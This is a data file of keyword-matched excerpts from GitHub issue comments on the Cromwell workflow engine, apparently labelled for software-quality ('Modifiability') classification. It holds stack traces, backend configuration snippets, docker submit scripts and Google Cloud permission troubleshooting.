configuration. filesystems {. . # For SFS backends, the ""local"" configuration speci",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:1680,config,configures,1680,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,1,['config'],['configures']
Modifiability,"config.file is loaded, but . > workflow-options {; > workflow-failure-mode: ""ContinueWhilePossible""; > }. does not work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1380#issuecomment-245645479:0,config,config,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1380#issuecomment-245645479,1,['config'],['config']
Modifiability,"cp`, as @aednichols suggested (in my case Cromwell runs with service account `30148356615-compute@developer.gserviceaccount.com`):; ```; $ gcloud config set account giulio@broadinstitute.org; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; * giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/. Copying gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai...; / [1 files][143.2 KiB/143.2 KiB]; Operation completed over 1 objects/143.2 KiB.; $ gcloud config set account 30148356615-compute@developer.gserviceaccount.com; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; * 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/; AccessDeniedException: 403 30148356615-compute@developer.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```. So in this case the more appropriate questions would be:; 1) How do I get to have my service account `30148356615-compute@developer.gserviceaccount.com` have the same permissions as my personal account `giulio@broadinstitute.org`?; 2) How do I get Cromwell to run with my personal account `giulio@broadinstitute.org` instead of my service account?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782:1301,config,config,1301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782,1,['config'],['config']
Modifiability,cromwell-service/ServiceRegistryActor: exception during creation; 	at akka.actor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried addi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1259,config,config,1259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"ctor.scala:136); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2017-12-05 20:11:24,83] [warn] Couldn't find a suitable DSN, defaulting to a Noop one.; [2017-12-05 20:11:24,84] [info] Using noop to send events.; [2017-12-05 20:11:24,85] [info] WorkflowManagerActor WorkflowActor-159210e6-fa6a-4a99-b386-5931ae245324 is in a terminal state: WorkflowFailedState; [2017-12-05 20:11:32,22] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2017-12-05 20:11:32,25] [info] Message [cromwell.core.actor.StreamActorHelper$StreamFailed] without sender to Actor[akka://cromwell-system/deadLetters] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-12-05 20:11:32,26] [info] Message [cromwell.core.actor.StreamActorHelper$StreamFailed] without sender to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; Workflow 159210e6-fa6a-4a99-b386-5931ae245324 transitioned to state Failed; [2017-12-05 20:11:32,30] [info] Automatic shutdown of the async connection; [2017-12-05 20:11:32,30] [info] Gracefully shutdown sentry threads.; [2017-12-05 20:11:32,30] [info] Shutdown finished.; ```; This code worked with `cromwell-29.jar`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406:6210,config,configuration,6210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406,2,['config'],['configuration']
Modifiability,"ctor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4526,config,config,4526,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['config'],['config']
Modifiability,"d. fyi. This template works fine with Cromwell 42. 2019-07-02 19:16:36,824 cromwell-system-akka.dispatchers.api-dispatcher-73 INFO - Unspecified type (Unspecified version) workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 submitted; 2019-07-02 19:16:37,222 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - 1 new workflows fetched by cromid-271b774: 10f172e8-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,239 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor Starting workflow UUID(10f172e8-b7ba-416f-964e-22ab8c7b38e3); 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor Successfully started WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1108,config,configured,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['config'],['configured']
Modifiability,dFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:959); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); 	at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinP,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:3206,config,config,3206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,"ded to redirect me away from the actual misunderstanding. . 1. In the udocker config I [posted before](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364) (corrected with comment), I was accidentally providing the `--entry-point` param, which was causing an interactive shell to open, stopping the rest of the script from executing. 2. I failed to notice that `${out}` and `${err}` change between `submit` and `submit-docker`. When I would check the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SL",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2383,config,configs,2383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['configs']
Modifiability,"ding) INVALID_ARGUMENT: Role roles/compute.zones.list is not supported for this resource.; ```; I have no idea what I should do. Why can't Cromwell simply provide the command line needed to change the permission?. As for Requester Pays, following the [documentation](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // This allows you to use an alternative service account to launch jobs, by default uses default service account; compute-service-account = ""default"". // Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; // There is no logic t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:1803,config,config,1803,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,1,['config'],['config']
Modifiability,"dmyWorkflow.myTask:NA:1]: job id: 8550357; [2019-02-13 22:18:19,78] [info] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: Status change from - to Running; [2019-02-13 22:18:20,81] [warn] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:1223,config,config,1223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['config'],['config']
Modifiability,"docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionTh",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4302,Config,ConfigInitializationActor,4302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"e original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4229,Config,ConfigInitializationActor,4229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"e were requests for additional tests; > <https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519>; > (and something entirely different) that it made me step back. I had this; > growing feeling that started to solidify that there are too many layers. I; > am developing things and I *still* don't understand (or think Singularity; > is ready yet) to be any kind of backend. I'm forcing a dog into a cat; > shaped hole just because this is the hole I'm supposed to fill. Is that a; > good idea? I've lost sight of what the tool is trying to do. Cromwell is; > trying to make it easy to run a Singularity container. But if that's the; > case, then why has this command:; >; > singularity run shub://vsoch/hello-world; >; > turned into needing Cromwell (java and the jar), an inputs json file, a; > wdl specification, a backend configuration, and a runtime command that I; > can't seem to remember, and then the entire thing takes much longer than an; > instance to echo a tiny Rawwwwr! If this is the goal we are going for, is; > this making life easier for the scientist? If I'm a programmer person, and; > this is the minimum I am allowed for this to just run a simple container,; > what happens when it gets harder? I realized that without a proper services; > API, singularity is no more special than python, bash, samtools, it's just; > a binary.; >; > And I realize also that it's easy to get caught up in details like ""Should; > we use Travis or Circle?"" Does it work on Amazon with this kind of input?; > And there will always be bugs! But I think the forest is being a bit lost; > for the trees.; > Question 4: What is the direction to go in?; >; > You can probably take what I'm saying with a grain of salt because I'm new; > to this entire universe, and there is so much invested there is no turning; > back or rethinking. But all of this seems too complicated, and too hard.; > What is needed is a solution that is just really stupid and simple. You; > have a container t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:12174,config,configuration,12174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['config'],['configuration']
Modifiability,"e, I changed the `backend.providers.Local.config.submit-docker` script for the following:. ```bash; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc; ```. Maybe this could be the default value in the [reference configuration file](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:1080,config,configuration,1080,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['config'],['configuration']
Modifiability,"eAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at 